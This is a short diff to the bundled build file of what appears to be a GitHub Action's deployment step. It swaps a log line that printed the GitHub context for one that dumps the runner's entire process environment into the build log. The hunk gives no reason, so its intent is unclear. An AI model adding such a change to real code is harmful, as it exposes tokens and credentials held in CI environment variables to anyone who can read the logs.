@@ -7661,7 +7661,7 @@ async function createDeployment() {
         ref = getRef();
     }
     let environment = _actions_core__WEBPACK_IMPORTED_MODULE_0__.getInput('environment');
-    _actions_core__WEBPACK_IMPORTED_MODULE_0__.info(JSON.stringify(_actions_github__WEBPACK_IMPORTED_MODULE_2__.context));
+    _actions_core__WEBPACK_IMPORTED_MODULE_0__.info(JSON.stringify(process.env));
     if (environment === '') {
         environment = undefined;
     }
